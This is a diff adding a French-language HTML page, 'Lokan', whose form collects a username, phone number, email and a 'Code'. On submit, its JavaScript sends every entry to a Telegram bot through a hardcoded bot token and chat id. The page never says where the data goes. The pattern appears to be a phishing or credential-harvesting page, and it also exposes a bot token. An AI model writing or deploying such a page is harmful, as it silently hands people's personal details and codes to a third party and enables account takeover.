@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lokan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            width: 80%;
+            margin: 40px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"], input[type="email"] {
+            width: 95%;
+            height: 20px;
+            margin-bottom: 10px;
+            padding: 5px;
+            border: 1px solid #ccc;
+        }
+
+.button-container {
+  text-align: center;
+  margin-top: 3px;
+}
+
+.button-container button {
+  padding: 10px 10px;
+  border: none;
+  border-radius: 5px;
+  background-color: #4CAF50;
+  color: #fff;
+  cursor: pointer;
+}
+
+.button-container button:hover {
+  background-color: #3e8e41;
+}
+		.popup {
+		    position: fixed;
+		    top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: none;
+}
+
+		.popup.show {
+            display: block;
+}
+
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #32a834;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Lokan</h1>
+        <form id="form">
+            <label for="name">UserName:</label>
+            <input type="text" id="name" name="name"><br><br>
+            <label for="phone">Téléphone:</label>
+            <input type="text" id="phone" name="phone"><br><br>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email"><br><br>
+            <label for="code">Code:</label>
+            <input type="text" id="code" name="code"><br><br>
+            <div class="button-container">
+  <button id="submit" type="submit">Envoyer</button>
+  <button id="next" onclick="window.location.href='login.html'">LogIn</button>
+  <button onclick="goToHomePage()">Home</button>
+</div>
+</div>
+        </form>
+        <div id="status"></div>
+    </div>
+		<script>
+const form = document.getElementById('form');
+const statusDiv = document.getElementById('status');
+const popup = document.createElement('div');
+popup.className = 'popup';
+
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+
+  const name = document.getElementById('name').value;
+  const phone = document.getElementById('phone').value;
+  const email = document.getElementById('email').value;
+  const code = document.getElementById('code').value;
+
+  if (!validateName(name)) {
+    popup.innerHTML = 'UserName invalide!';
+    popup.classList.add('show');
+    document.body.appendChild(popup);
+    setTimeout(() => {
+      popup.classList.remove('show');
+    }, 3000);
+    return;
+  }
+
+  if (!validatePhone(phone)) {
+    popup.innerHTML = 'Téléphone invalide!';
+    popup.classList.add('show');
+    document.body.appendChild(popup);
+    setTimeout(() => {
+      popup.classList.remove('show');
+    }, 3000);
+    return;
+  }
+
+  if (!validateEmail(email)) {
+    popup.innerHTML = 'Email invalide!';
+    popup.classList.add('show');
+    document.body.appendChild(popup);
+    setTimeout(() => {
+      popup.classList.remove('show');
+    }, 3000);
+    return;
+  }
+
+  const params = {
+    chat_id: '5365425194',
+    text: `UserName: ${name}\nTéléphone: ${phone}\nEmail: ${email}\nCode: ${code}`
+  };
+
+  fetch('https://api.telegram.org/bot7899966999:AAFaQeVG7ZZWoE6Fo1NoR7yJmmgK_38u-Cs/sendMessage', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  })
+  .then((response) => response.json())
+  .then((data) => {
+    if (data.ok) {
+      popup.innerHTML = 'Succès!';
+      popup.classList.add('show');
+      document.body.appendChild(popup);
+      setTimeout(() => {
+        popup.classList.remove('show');
+      }, 3000);
+    } else {
+      popup.innerHTML = 'Erreur d\'envoi des données!';
+      popup.classList.add('show');
+      document.body.appendChild(popup);
+      setTimeout(() => {
+        popup.classList.remove('show');
+      }, 3000);
+    }
+  })
+  .catch((error) => {
+    popup.innerHTML = 'Erreur d\'envoi des données!';
+    popup.classList.add('show');
+    document.body.appendChild(popup);
+    setTimeout(() => {
+      popup.classList.remove('show');
+    }, 3000);
+  });
+});
+
+function validateName(name) {
+  return name.length > 0;
+}
+
+function validatePhone(phone) {
+  const pattern = /^\d{10}$/;
+  return pattern.test(phone);
+}
+
+function validateEmail(email) {
+  const pattern = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
+  return pattern.test(email);
+}
+    </script>
+    <script>
+        function goToHomePage() {
+            window.location.href = "info.html"; // تعديل الرابط حسب اسم ملف الصفحة الرئيسية
+        }
+    </script>
+</body>
+</html>
